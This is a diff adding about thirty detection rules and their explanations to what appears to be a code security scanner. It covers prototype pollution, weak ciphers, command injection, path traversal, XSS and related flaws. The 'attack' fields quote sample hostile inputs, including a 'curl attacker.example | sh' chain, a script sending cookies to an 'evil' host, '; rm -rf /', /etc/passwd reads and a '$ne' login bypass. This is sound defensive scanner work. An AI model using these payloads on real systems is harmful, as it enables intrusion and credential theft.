@@ -507,6 +507,186 @@ RULE_EXPLANATIONS: dict[str, dict[str, str]] = {
         "false_positive": "Code generators, template engines, or REPL tools may use eval legitimately. Verify input is never user-controlled.",
         "test": "Replace dynamic evaluation with a safe parser (e.g. ast.literal_eval, JSON.parse). Add a test with malicious input.",
     },
+    "SP051": {
+        "why": "Merging request-controlled objects into application objects lets __proto__ or constructor keys rewrite prototypes for every instance.",
+        "attack": 'Attacker submits {"__proto__":{"isAdmin":true}} in a merge payload, polluting defaults used by later authorization checks.',
+        "false_positive": "Merges over schemas that strip dangerous keys or use Map-based storage are safe; verify the filter runs first.",
+        "test": "Send a payload containing __proto__ and constructor keys and assert the target prototype is unchanged.",
+    },
+    "SP052": {
+        "why": "A signing secret committed next to the code it protects lets anyone with repository access mint valid tokens.",
+        "attack": "Attacker reads the secret from a public repository, signs an admin JWT, and calls privileged endpoints directly.",
+        "false_positive": "Test fixtures using obviously fake secrets (e.g. 'test-secret') outside production paths.",
+        "test": "Move the secret to environment configuration, rotate the leaked value, and assert forged tokens fail verification.",
+    },
+    "SP053": {
+        "why": "DES, Blowfish, and RC4 have known practical attacks; data encrypted with them is recoverable by determined adversaries.",
+        "attack": "Attacker captures legacy-encrypted payloads or backups and recovers plaintext with known cryptanalytic techniques.",
+        "false_positive": "Interoperability shims decrypting existing archives are transitional; flag new encryption instead.",
+        "test": "Re-encrypt a sample payload with AES-GCM and verify old weak-cipher paths reject or migrate it.",
+    },
+    "SP054": {
+        "why": "os.system and os.popen always run through a shell, so interpolated metacharacters execute as commands.",
+        "attack": "Attacker supplies '; rm -rf /' style input that the interpolated command string executes with process privileges.",
+        "false_positive": "Fully constant command strings carry no injection risk but still signal shell reliance worth reviewing.",
+        "test": "Switch to subprocess.run([...], shell=False) and add a test passing semicolons and backticks through inputs.",
+    },
+    "SP055": {
+        "why": "Template-literal arguments reach child_process through a shell, so any interpolated value can chain commands.",
+        "attack": "Attacker-controlled segment adds '&& curl attacker.example | sh', executing arbitrary code in the deployment.",
+        "false_positive": "Templates interpolating only validated numeric IDs remain risky-by-pattern; confirm validation upstream.",
+        "test": "Replace with execFile(cmd, [args]) and add a regression test injecting shell metacharacters.",
+    },
+    "SP056": {
+        "why": "Without HttpOnly, any XSS can read session cookies via document.cookie and exfiltrate live sessions.",
+        "attack": "Injected script posts document.cookie to an external endpoint, hijacking every visitor's session.",
+        "false_positive": "Non-sensitive preference cookies matching the name hints are review noise; rename them if flagged.",
+        "test": "Set httpOnly: true and assert document.cookie no longer exposes the session value in a browser test.",
+    },
+    "SP057": {
+        "why": "Missing SameSite lets cross-site requests ride along with the cookie, enabling CSRF on state-changing routes.",
+        "attack": "Third-party page triggers a form POST; the browser attaches the session cookie and the action succeeds silently.",
+        "false_positive": "APIs already protected by token headers may not need SameSite; document the compensating control.",
+        "test": "Set sameSite: 'lax' and verify a cross-site POST without CSRF token is rejected.",
+    },
+    "SP058": {
+        "why": "Query strings are logged by browsers, proxies, and servers; embedded credentials leak far beyond the request.",
+        "attack": "Attacker reads proxy or CDN logs, harvests the api_key values, and replays them against the API.",
+        "false_positive": "Opaque short-lived one-time tokens designed for links (magic sign-in) are a documented exception.",
+        "test": "Move the credential to an Authorization header and assert access logs contain no secret material.",
+    },
+    "SP059": {
+        "why": "Passing raw request data into $gt/$ne operators turns login checks into always-true comparisons.",
+        "attack": 'Attacker sends {"password": {"$ne": null}} to bypass authentication entirely.',
+        "false_positive": "Internal analytics queries without credential semantics are lower risk; still coerce types.",
+        "test": "Submit operator-style payloads to login and assert authentication rejects non-scalar credentials.",
+    },
+    "SP060": {
+        "why": "include/require over request-controlled paths executes attacker-chosen files with application privileges.",
+        "attack": "Attacker points ?page=../../uploads/shell.txt (or a php:// wrapper) and gains remote code execution.",
+        "false_positive": "Includes behind strict allowlist maps that never touch request values are safe.",
+        "test": "Request traversal and wrapper variants (../, php://input) and assert only allowlisted modules load.",
+    },
+    "SP061": {
+        "why": "Bare except hides programming errors and security failures alike, turning crashes into undefined behavior downstream.",
+        "attack": "A swallowed auth exception leaves default-deny disabled while the request continues as authenticated.",
+        "false_positive": "Top-level task boundaries that log-and-reexit may intentionally catch broadly; verify logging exists.",
+        "test": "Replace with typed exceptions and add a test asserting unexpected errors propagate to error handling.",
+    },
+    "SP062": {
+        "why": "/e made preg_replace evaluate replacements as PHP code; any subject influence becomes code execution.",
+        "attack": "Attacker injects [email protected]\"system('id')\" into a field passed as replacement input to execute commands.",
+        "false_positive": "None realistic on supported PHP versions; /e was removed in PHP 7 and always meant RCE here.",
+        "test": "Migrate to preg_replace_callback and assert crafted subjects no longer execute functions.",
+    },
+    "SP063": {
+        "why": "Without noopener, an opened site can repoint this tab (window.opener) into a phishing clone.",
+        "attack": "Attacker links victims to their page, which rewrites the original tab to a fake login after navigation.",
+        "false_positive": "Same-origin blank links may rely on opener deliberately; scope the rule to external hrefs when refining.",
+        "test": "Add rel=noopener noreferrer and assert window.opener stays null from the opened document.",
+    },
+    "SP064": {
+        "why": "if (x = y) assigns instead of comparing, so the branch follows truthiness of the assigned value.",
+        "attack": "A mistyped authorization check like if (user.role = ADMIN) grants admin to everyone who reaches it.",
+        "false_positive": "Deliberate assign-and-test idioms exist; rewrite them as explicit comparisons to silence findings.",
+        "test": "Change the assignment to == and add a unit test covering both branches of the condition.",
+    },
+    "SP065": {
+        "why": "Jakarta EL evaluates expressions like ${runtime.exec('id')} when raw request data reaches expression factories.",
+        "attack": "Attacker submits an EL payload as a parameter, executing methods inside the JVM sandbox of the app.",
+        "false_positive": "Templates rendering developer-controlled constants are safe; only request-sourced evaluation is flagged.",
+        "test": "Send ${'a'.getClass()} style parameters and assert they are treated as literal data, never evaluated.",
+    },
+    "SP066": {
+        "why": "PHP shell functions interpret metacharacters, so unescaped request data chains arbitrary commands.",
+        "attack": "Attacker appends '; cat /etc/passwd' to a filename processed by exec/system and reads server files.",
+        "false_positive": "Calls where every argument passes escapeshellarg are mitigated; keep them out of the matched line.",
+        "test": "Wrap inputs with escapeshellarg or move to proc_open arg arrays and rerun injection probes.",
+    },
+    "SP067": {
+        "why": "Credentials committed in configuration files leak through clones, forks, CI logs, and backup archives.",
+        "attack": "Anyone with repository read access extracts production secrets without touching any runtime system.",
+        "false_positive": "Placeholder references (${DB_PASSWORD}, empty values) are skipped; ensure real literals are rotated.",
+        "test": "Move values to environment references and scan history to confirm no literal remains.",
+    },
+    "SP068": {
+        "why": "0777 lets any local account or compromised neighbor process rewrite the file and hijack whatever reads it.",
+        "attack": "Co-tenant user replaces a world-writable config or script; the service executes the tampered content.",
+        "false_positive": "Shared scratch directories deliberately world-writable are rare in services; isolate them instead.",
+        "test": "Set 0640/0750 and rerun the workload under two users to prove writes fail for outsiders.",
+    },
+    "SP069": {
+        "why": "math/rand reseeded from the clock produces predictable sequences; anything security-bearing from it is guessable.",
+        "attack": "Attacker reproduces the seed window locally and enumerates generated reset tokens until one matches.",
+        "false_positive": "Simulation, sampling, and shuffling code without token semantics is safe to leave on math/rand.",
+        "test": "Swap to crypto/rand and assert two processes started in the same millisecond produce different tokens.",
+    },
+    "SP070": {
+        "why": "CheckOrigin returning true upgrades sockets from any page, so cross-site JS rides the victim's credentials.",
+        "attack": "Malicious site opens ws://victim/internal-socket and exchanges commands using the visitor's session cookies.",
+        "false_positive": "Local dev tooling bound to localhost may accept all origins; scope that config out of deploys.",
+        "test": "Open the socket from a foreign origin and assert the upgrade handshake is rejected.",
+    },
+    "SP071": {
+        "why": "VERIFY_NONE disables chain and hostname validation, so any MITM can impersonate every endpoint silently.",
+        "attack": "Attacker on the network presents any self-signed cert and captures API keys and session payloads.",
+        "false_positive": "One-off scripts against local self-signed servers; gate those behind explicit dev flags.",
+        "test": "Remove VERIFY_NONE, point at a bad-TLS host, and assert the request fails closed with a clear error.",
+    },
+    "SP072": {
+        "why": "eval compiles input into running code; request/session sources make every user an interpreter guest.",
+        "attack": "Attacker posts `system('cat config/database.yml')` as a param and reads secrets through eval.",
+        "false_positive": "Admin-only consoles evaluating trusted internal DSLs are still high risk; sandbox or remove.",
+        "test": "Send Ruby syntax payloads to the parameter and assert the app treats them as opaque strings.",
+    },
+    "SP073": {
+        "why": 'Requesting only "AES" makes the JCA provider choose ECB with PKCS5 padding by default.',
+        "attack": "Identical plaintext blocks encrypt identically; attackers reconstruct structured data from ciphertext patterns.",
+        "false_positive": "Legacy decrypt-only paths may need the default transform; scope new encryption instead.",
+        "test": "Encrypt alternating blocks and assert ciphertext differs per block after moving to GCM.",
+    },
+    "SP074": {
+        "why": "Runtime.exec splits the concatenated string via StringTokenizer, letting spaces and metacharacters add arguments or commands.",
+        "attack": "A filename argument containing '; sh -c …' escapes the intended binary and runs attacker commands.",
+        "false_positive": "Fully constant command strings are low risk but should still move to ProcessBuilder arrays.",
+        "test": "Switch to ProcessBuilder(args) and add a probe passing semicolons and quotes through inputs.",
+    },
+    "SP075": {
+        "why": "send_file over request values walks whatever path the client supplies, including traversal outside the app root.",
+        "attack": "Attacker requests ?file=../../../../etc/passwd and receives arbitrary readable server files.",
+        "false_positive": "Endpoints mapping fixed IDs to curated paths via dictionaries are safe when no raw join occurs.",
+        "test": "Probe traversal sequences and wrappers; assert only allowlisted files are ever served.",
+    },
+    "SP076": {
+        "why": "res.sendFile trusts the resolved path; request-driven values escape the public root with ../ sequences.",
+        "attack": "Attacker fetches /download?name=../../../.env and exfiltrates configuration secrets.",
+        "false_positive": "Routes already normalizing through path.resolve plus a prefix check are mitigated; keep the check visible.",
+        "test": "Send traversal payloads and assert 404/400 responses with no file contents returned.",
+    },
+    "SP077": {
+        "why": "Exception stacks enumerate frameworks, versions, file layout, and sometimes connection strings — recon gold.",
+        "attack": "Attacker triggers malformed input on purpose, then targets dependencies named inside the returned stack.",
+        "false_positive": "Internal admin debug pages gated behind auth may show stacks; keep them out of public routes.",
+        "test": "Trigger a forced error and assert the response body contains a reference ID but no stack frames.",
+    },
+    "SP078": {
+        "why": "extract() imports each request key as a variable, so crafted parameters overwrite locals before auth checks.",
+        "attack": "Attacker sends ?authed=1 to flip the flag the script checks later, bypassing login logic entirely.",
+        "false_positive": "Calls passing EXTR_SKIP after pre-seeded defaults are skipped by this rule.",
+        "test": "Replace with explicit assignments and send override payloads asserting state cannot be flipped.",
+    },
+    "SP079": {
+        "why": "Unconstrained @RequestMapping answers HEAD/OPTIONS/TRACE too, expanding CSRF, caching, and verb-tampering surface.",
+        "attack": "Attacker issues a TRACE/OPTIONS variant of a sensitive route that skips method-scoped filters.",
+        "false_positive": "Intentional catch-all controllers proxying verbs should document the design next to the annotation.",
+        "test": "Constrain with method= or @GetMapping and probe other verbs expecting 405 responses.",
+    },
+    "SP080": {
+        "why": "Concatenating request values into inline HTML strings bypasses every template auto-escaping layer the framework provides.",
+        "attack": "Attacker submits <script>document.location='//evil?c='+document.cookie as a value rendered into the response.",
+        "false_positive": "Responses interpolating only server-controlled constants are safe; request-derived values are the risk.",
+        "test": "Send <script>alert(1)</script> through the interpolated value and assert it appears encoded, never executed.",
+    },
     "SP102": {
         "why": "Enabling shell execution passes the command through a shell interpreter, enabling injection via metacharacters (;, |, $()).",
         "attack": "Attacker injects shell metacharacters into a parameter that reaches subprocess with shell enabled.",
@@ -3724,6 +3904,437 @@ RULES: tuple[Rule, ...] = (
         redact=True,
     ),
     Rule(
+        "SP051",
+        "Prototype pollution via merge of request data",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""\b(?:[\w$.]*\.)?(?:deepMerge|mergeDeep|deepExtend|deepAssign|defaultsDeep|merge|extend|set)\s*\(\s*[^,()]{1,80},\s*(?:req(?:uest)?\s*\.\s*(?:body|query|params)|JSON\.parse\s*\(\s*req(?:uest)?\.\w+\s*\))"""
+        ),
+        "A merge or set helper receives request-controlled data, allowing __proto__/constructor keys to pollute object prototypes.",
+        "Reject __proto__, constructor, and prototype keys before merging, or copy with an explicit key allowlist and add a pollution regression test.",
+        "CWE-1321",
+        "OWASP ASVS V5",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx"}),
+    ),
+    Rule(
+        "SP052",
+        "JWT signed with hardcoded string secret",
+        "security",
+        "high",
+        "high",
+        compile_pattern(
+            r"""(?:jwt\.sign|jsonwebtoken\.sign|SignJWT)\s*\([^,]*,\s*["'][^"']{8,}["']"""
+        ),
+        "A JWT is signed with a secret literal committed to source control; anyone with repository access can forge valid tokens.",
+        "Load the signing secret from a managed secret store and rotate it; verify tokens with key IDs and expiry.",
+        "CWE-321",
+        "OWASP ASVS V6",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP053",
+        "Weak or legacy block cipher selected",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""createCipheriv\s*\(\s*["'](?:des|des3|des-ede|bf|blowfish|rc4)[^"']*["']|CryptoJS\.(?:DES|TripleDES|RC4)\.|getInstance\s*\(\s*["'](?:DES|Blowfish|RC4)|from\s+Crypto\.Cipher\s+import\s+(?:DES|ARC4)|(?:^|\n)\s*(?:DES|ARC4)\.new\s*\("""
+        ),
+        "DES, 3DES, Blowfish, or RC4 provide inadequate confidentiality for new data.",
+        "Migrate to AES-GCM (or ChaCha20-Poly1305) with unique nonces and re-encrypt stored data.",
+        "CWE-327",
+        "OWASP ASVS V6",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".py", ".java"}),
+    ),
+    Rule(
+        "SP054",
+        "Shell command built with interpolation",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""os\.(?:system|popen)\s*\(\s*(?:f["']|["'][^"']*["']\s*%|\`[^\`]*\$\{)"""
+        ),
+        "An os.system or os.popen command appears to be built with string interpolation.",
+        "Pass an argument list to subprocess without a shell and validate every externally controlled argument.",
+        "CWE-78",
+        "OWASP ASVS V5",
+        frozenset({".py"}),
+    ),
+    Rule(
+        "SP055",
+        "Node command built with template interpolation",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(r"""(?<![\w.$])(?:execSync|spawnSync|exec)\s*\(\s*`[^`]*\$\{"""),
+        "A child-process call receives an interpolated template literal, which executes through a shell.",
+        "Use spawn/execFile with an argument array and never interpolate input into the command string.",
+        "CWE-78",
+        "OWASP ASVS V5",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP056",
+        "Session cookie without HttpOnly",
+        "security",
+        "medium",
+        "medium",
+        compile_pattern(
+            r"""\.cookie\s*\(\s*["'][^"']*(?:sess|session|token|jwt|auth|refresh)[^"']*["']\s*,(?![^)]*\bhttpOnly\b)[^)]*\)"""
+        ),
+        "An authentication or session cookie is set without HttpOnly, exposing it to JavaScript during XSS.",
+        "Set httpOnly (with Secure and SameSite) on every session-bearing cookie.",
+        "CWE-1004",
+        "OWASP ASVS V3",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP057",
+        "Session cookie without SameSite",
+        "security",
+        "low",
+        "medium",
+        compile_pattern(
+            r"""\.cookie\s*\(\s*["'][^"']*(?:sess|session|token|jwt|auth|refresh)[^"']*["']\s*,(?![^)]*\bsameSite\b)[^)]*\)"""
+        ),
+        "An authentication or session cookie is set without an explicit SameSite attribute.",
+        "Set SameSite=Lax or Strict together with Secure on session cookies.",
+        "CWE-1275",
+        "OWASP ASVS V3",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP058",
+        "Credential embedded in URL query string",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""["']https?://[^"'\s]{0,200}[?&](?<![a-z0-9_])(?:password|passwd|secret|api_?key|access_?token|auth_?token|session_?token|bearer)=[^"']*["']"""
+        ),
+        "A credential appears inside a URL query string, which leaks via browser history, proxies, and access logs.",
+        "Move credentials into headers or request bodies and rotate any value already committed.",
+        "CWE-598",
+        "OWASP ASVS V14",
+        frozenset(set()),
+    ),
+    Rule(
+        "SP059",
+        "MongoDB operator injection from request",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""\$\s*(?:gt|gte|lt|lte|ne|regex|where)\s*:\s*req(?:uest)?\.(?:body|query|params)"""
+        ),
+        "A MongoDB comparison operator receives raw request data, letting attackers append $gt/$ne style filters to bypass authentication.",
+        "Validate and coerce credentials to expected scalar types before building query operators.",
+        "CWE-943",
+        "OWASP ASVS V4",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP060",
+        "Dynamic include or require of request data",
+        "security",
+        "critical",
+        "high",
+        compile_pattern(
+            r"""(?:include|require)(?:_once)?\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|(?:include|require)(?:_once)?\s+\$[A-Za-z_]|(?:include|require)(?:_once)?\s*\(\s*\$[A-Za-z_]\w*\s*\)"""
+        ),
+        "A PHP include/require consumes request-controlled paths, allowing attackers to execute uploaded or remote files.",
+        "Use an allowlist mapping identifiers to fixed file paths and reject anything containing separators or wrappers.",
+        "CWE-98",
+        "OWASP ASVS V5",
+        frozenset({".php"}),
+    ),
+    Rule(
+        "SP061",
+        "Overly broad exception handler",
+        "correctness",
+        "low",
+        "high",
+        compile_pattern(r"""\bexcept\s*:|except\s+Exception\s*:"""),
+        "A bare except or except Exception swallows unrelated failures, masking bugs and security-relevant errors.",
+        "Catch the narrowest expected exception types and let unexpected ones propagate to structured handling.",
+        "CWE-396",
+        "OWASP ASVS V14",
+        frozenset({".py"}),
+    ),
+    Rule(
+        "SP062",
+        "PHP preg_replace with /e evaluator modifier",
+        "security",
+        "critical",
+        "high",
+        compile_pattern(r"""preg_replace\s*\(\s*["'][^"']*/e["']"""),
+        "The removed /e modifier evaluates the replacement string as PHP code, turning crafted subjects into remote code execution.",
+        "Replace with preg_replace_callback and never evaluate replacement strings.",
+        "CWE-624",
+        "OWASP ASVS V5",
+        frozenset({".php"}),
+    ),
+    Rule(
+        "SP063",
+        "Blank target link without noopener",
+        "security",
+        "medium",
+        "high",
+        compile_pattern(r"""<a\s+[^>]*target=["']?_blank["']?(?![^>]*rel\s*=)[^>]*>"""),
+        "A target=_blank anchor without rel=noopener lets the opened page control this page through window.opener.",
+        'Add rel="noopener noreferrer" to every external blank-target link.',
+        "CWE-1022",
+        "OWASP ASVS V14",
+        frozenset({".html", ".htm", ".jsx", ".tsx", ".vue", ".js", ".ts"}),
+    ),
+    Rule(
+        "SP064",
+        "Assignment inside Java condition",
+        "correctness",
+        "medium",
+        "medium",
+        compile_pattern(r"""\bif\s*\(\s*[A-Za-z_$][\w$.<>\[\]]*\s*=\s*(?!=)"""),
+        "An assignment (=) inside an if condition is usually a mistyped equality check, silently changing program state.",
+        "Use == or .equals for comparison; if assignment is intended, compare explicitly against the assigned value.",
+        "CWE-481",
+        "OWASP ASVS V14",
+        frozenset({".java"}),
+    ),
+    Rule(
+        "SP065",
+        "Expression Language evaluation of request input",
+        "security",
+        "critical",
+        "medium",
+        compile_pattern(
+            r"""(?:createValueExpression|ValueExpression|evaluateExpression)\s*\([^)]*(?:getParameter|req\.|request\.|param\.)"""
+        ),
+        "Feeding request parameters into a Jakarta/Java EL evaluation allows attackers to execute expressions inside the application.",
+        "Treat EL as code: never pass request data into expression factories; map inputs through typed DTOs.",
+        "CWE-917",
+        "OWASP ASVS V5",
+        frozenset({".java", ".jsp"}),
+    ),
+    Rule(
+        "SP066",
+        "PHP shell call with raw superglobal",
+        "security",
+        "critical",
+        "high",
+        compile_pattern(
+            r"""\$_(?:GET|POST|REQUEST|COOKIE)[^\n]*(?:\bexec\b|\bshell_exec\b|\bsystem\b|\bpassthru\b|\bproc_open\b)|(?:\bexec\b|\bshell_exec\b|\bsystem\b|\bpassthru\b|\bproc_open\b)\s*\([^\n]*\$_(?:GET|POST|REQUEST|COOKIE)|(?:\bshell_exec\b|\bexec\b|\bsystem\b|\bpassthru\b)\s*\(\s*["'][^"']*["']\s*\.\s*\$"""
+        ),
+        "Request data reaches a PHP shell-execution function without escapeshellarg, enabling OS command injection.",
+        "Reject shell calls on request input; when unavoidable, wrap every argument in escapeshellarg and allowlist values.",
+        "CWE-88",
+        "OWASP ASVS V5",
+        frozenset({".php"}),
+    ),
+    Rule(
+        "SP067",
+        "Credential committed in configuration file",
+        "security",
+        "high",
+        "high",
+        compile_pattern(
+            r"""(?im)^[ \t]*[A-Za-z0-9_.\-]*(?:password|passwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token)[A-Za-z0-9_.\-]*[ \t]*[:=][ \t]*(?![\"']?\{?\$)[\"']?([^\s\"'#]{4,})"""
+        ),
+        "A configuration file assigns a literal credential value instead of referencing a secret store placeholder.",
+        "Replace the literal with an environment reference and rotate any value already committed.",
+        "CWE-256",
+        "OWASP ASVS V14",
+        frozenset({".properties", ".yml", ".yaml", ".ini", ".cfg", ".conf", ".toml"}),
+        redact=True,
+    ),
+    Rule(
+        "SP068",
+        "World-writable file mode in Go",
+        "security",
+        "high",
+        "high",
+        compile_pattern(
+            r"""(?:ioutil\.WriteFile|os\.WriteFile|os\.OpenFile|os\.Chmod)\s*\([^)]*0?o?777\b"""
+        ),
+        "Files created or chmod-ed to 0777 are writable by every user and process on the host.",
+        "Grant the narrowest mode that works (0644 files, 0755 dirs) and document any exception.",
+        "CWE-732",
+        "OWASP ASVS V14",
+        frozenset({".go"}),
+    ),
+    Rule(
+        "SP069",
+        "Go math/rand seeded from time for generated values",
+        "security",
+        "medium",
+        "medium",
+        compile_pattern(r"""rand\.New\(rand\.NewSource\(time\.(?:Now|Unix)"""),
+        "math/rand reseeded from the clock is predictable; identifiers or tokens derived from it can be guessed.",
+        "Use crypto/rand for security-relevant generation and keep math/rand for simulations only.",
+        "CWE-330",
+        "OWASP ASVS V6",
+        frozenset({".go"}),
+    ),
+    Rule(
+        "SP070",
+        "WebSocket upgrader accepts every origin",
+        "security",
+        "medium",
+        "high",
+        compile_pattern(r"""CheckOrigin\s*:\s*func.{0,80}?return\s+true"""),
+        "A WebSocket upgrader whose CheckOrigin always returns true lets any website open cross-site sockets with user credentials.",
+        "Validate req.Host (and Origin when present) against an allowlist inside CheckOrigin.",
+        "CWE-1385",
+        "OWASP ASVS V14",
+        frozenset({".go"}),
+    ),
+    Rule(
+        "SP071",
+        "Ruby TLS verification disabled",
+        "security",
+        "high",
+        "high",
+        compile_pattern(r"""OpenSSL::SSL::VERIFY_NONE"""),
+        "VERIFY_NONE accepts any certificate, opening every outbound TLS connection to interception.",
+        "Keep VERIFY_PEER and configure a proper CA bundle; pin certificates for fixed endpoints.",
+        "CWE-295",
+        "OWASP ASVS V9",
+        frozenset({".rb", ".erb"}),
+    ),
+    Rule(
+        "SP072",
+        "Ruby eval of request-controlled data",
+        "security",
+        "critical",
+        "high",
+        compile_pattern(
+            r"""\beval\s*\(\s*(?:params\[|request\.(?:params|raw_post)|session\[|cookies\[)"""
+        ),
+        "eval on Rails request/session data executes attacker-supplied code with full interpreter privileges.",
+        "Parse input as data (JSON, typed casts) and remove every evaluation path that touches request state.",
+        "CWE-95",
+        "OWASP ASVS V5",
+        frozenset({".rb", ".erb"}),
+    ),
+    Rule(
+        "SP073",
+        "Java cipher requested without explicit transform",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""Cipher\.getInstance\s*\(\s*"AES"\s*\)|Cipher\.getInstance\s*\(\s*"DES\/ECB"""
+        ),
+        'getInstance("AES") silently selects AES/ECB/PKCS5Padding; ECB reveals repeated plaintext blocks.',
+        "Request an explicit secure transform such as AES/GCM/NoPadding with unique nonces.",
+        "CWE-327",
+        "OWASP ASVS V6",
+        frozenset({".java", ".jsp", ".kt"}),
+    ),
+    Rule(
+        "SP074",
+        "Java Runtime.exec built by concatenation",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(r"""Runtime\.getRuntime\(\)\s*\.\s*exec\s*\([^)]*\+\s*[A-Za-z_$]"""),
+        "Concatenating values into a Runtime.exec command string lets shell metacharacters inject extra commands.",
+        "Use ProcessBuilder with an argument array and validate each externally controlled argument.",
+        "CWE-78",
+        "OWASP ASVS V5",
+        frozenset({".java", ".jsp"}),
+    ),
+    Rule(
+        "SP075",
+        "Flask file response driven by request data",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""(?:send_file|send_from_directory)\s*\([^)]*(?:request\.(?:args|form|values|files|json)\b|request\.values\.get\s*\()"""
+        ),
+        "Serving files from request parameters enables path traversal into arbitrary readable locations.",
+        "Map user selections to allowlisted server-side paths and never join raw request values onto filesystem paths.",
+        "CWE-22",
+        "OWASP ASVS V12",
+        frozenset({".py"}),
+    ),
+    Rule(
+        "SP076",
+        "Express res.sendFile with request-derived path",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""sendFile\s*\(\s*(?:req(?:uest)?\.(?:query|params|body)|(?:path\.)?join\s*\([^)]*req(?:uest)?\.(?:query|params|body))"""
+        ),
+        "res.sendFile over request-controlled paths reads arbitrary files relative to the process.",
+        "resolve the final path and require it to stay inside a dedicated public root before responding.",
+        "CWE-22",
+        "OWASP ASVS V12",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP077",
+        "Stack trace returned to HTTP client",
+        "security",
+        "medium",
+        "high",
+        compile_pattern(
+            r"""res(?:ponse)?\s*\.\s*(?:status\s*\(\s*\d{3}\s*\)\s*\.\s*)?(?:send|json)\s*\([^)]*\b[A-Za-z_$][\w$]*\.stack\b"""
+        ),
+        "Returning exception stacks exposes source paths, library versions, and internal topology to attackers.",
+        "Log the stack server-side with an identifier and return a generic error body plus that reference.",
+        "CWE-209",
+        "OWASP ASVS V14",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
+        "SP078",
+        "PHP extract of request superglobal",
+        "security",
+        "high",
+        "high",
+        compile_pattern(r"""(?<![\w$])extract\s*\(\s*\$_(?:GET|POST|REQUEST)(?![^)]*EXTR_SKIP)"""),
+        "extract() turns query or body keys into PHP variables, letting attackers overwrite script state.",
+        "Access request values explicitly by name; if extract is unavoidable, pass EXTR_SKIP and pre-seed variables.",
+        "CWE-453",
+        "OWASP ASVS V5",
+        frozenset({".php"}),
+    ),
+    Rule(
+        "SP079",
+        "Spring mapping without HTTP method constraint",
+        "security",
+        "low",
+        "medium",
+        compile_pattern(
+            r"""@RequestMapping\s*\((?![^)]*method\s*=)[^)]*\)|@RequestMapping(?!\s*\()"""
+        ),
+        "A @RequestMapping without method= registers for every HTTP verb, widening CSRF and caching exposure.",
+        "Constrain mappings with method = RequestMethod.GET/POST or prefer @GetMapping/@PostMapping shortcuts.",
+        "CWE-650",
+        "OWASP ASVS V14",
+        frozenset({".java", ".jsp", ".kt"}),
+    ),
+    Rule(
+        "SP080",
+        "HTML response built from interpolated request data",
+        "security",
+        "high",
+        "medium",
+        compile_pattern(
+            r"""(?:res(?:ponse)?\s*\.\s*(?:send|write)|\.send)\s*\(\s*`[^`]*<[a-zA-Z][a-zA-Z0-9]*[^`]*\$\{"""
+        ),
+        "An HTTP response embeds request-derived values directly into an inline HTML template, enabling reflected cross-site scripting.",
+        "Render through the framework's auto-escaping template engine and encode by output context; never concatenate HTML strings.",
+        "CWE-80",
+        "OWASP ASVS V5",
+        frozenset({".js", ".mjs", ".cjs", ".ts", ".tsx"}),
+    ),
+    Rule(
         "SP002",
         "AWS access key committed",
         "security",
@@ -4437,7 +5048,7 @@ RULES: tuple[Rule, ...] = (
         "high",
         "medium",
         compile_pattern(
-            r"""(?:execute|query|raw)\s*\(\s*(?:f["\']|`[^`]*\$\{|["\'][^"\']*["\']\s*%|[^,]+\.format\()"""
+            r"""(?:execute|query|raw)\s*\(\s*(?:f["']|`[^`]*\$\{|["'][^"']*["']\s*%|[^,]+\.format\(|["'][^"']*["']\s*\+\s*(?:[A-Za-z_$]|["']))"""
         ),
         "A database query appears to be built with string interpolation.",
         "Use parameterized queries or the ORM's bound parameters and add an injection regression test.",
@@ -4512,7 +5123,7 @@ RULES: tuple[Rule, ...] = (
         "Require an explicit authorization dependency or verify and document an application-wide control.",
         "CWE-862",
         "OWASP ASVS V4",
-        frozenset({".py"}),
+        frozenset({".py", ".js", ".mjs", ".cjs", ".ts"}),
     ),
     Rule(
         "SP109",
@@ -4521,7 +5132,7 @@ RULES: tuple[Rule, ...] = (
         "high",
         "medium",
         compile_pattern(
-            r"""(?:https?://(?:169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1|localhost)|(?:requests|httpx|fetch|axios|http)\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.query|request\.args|req\.body|user_url|user_input)\b)"""
+            r"""(?:(?:get|post|put|delete|request|head)\s*\(\s*["'`]https?://(?:169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1|localhost)|(?:requests|httpx|fetch|axios|http)\.(?:get|post|put|delete|request)\s*\(\s*(?:req\.query|request\.args|req\.body|user_url|user_input)\b)"""
         ),
         "An outbound HTTP request may target internal endpoints, localhost, or cloud metadata.",
         "Validate destination URLs against an allowlist and block private IP ranges.",
@@ -4536,7 +5147,7 @@ RULES: tuple[Rule, ...] = (
         "high",
         "medium",
         compile_pattern(
-            r"""(?:open|readFile|readFileSync|createReadStream|unlink|rmSync)\s*\(\s*(?:f["'][^"']*\{|\`[^\`]*\$\{|(?:path\.)?join\s*\([^)]*(?:req\.|params|query|user_input))"""
+            r"""(?:(?<![\w.$])open\s*\(\s*(?:f["'][^"']*\{|`[^`]*\$\{)|(?:fs\.)?(?:readFile|readFileSync|writeFileSync|createReadStream|unlink|rmSync)\s*\(\s*`[^`]*\$\{|(?:path\.)?join\s*\([^)]*(?:req\.|params|query|user_input))"""
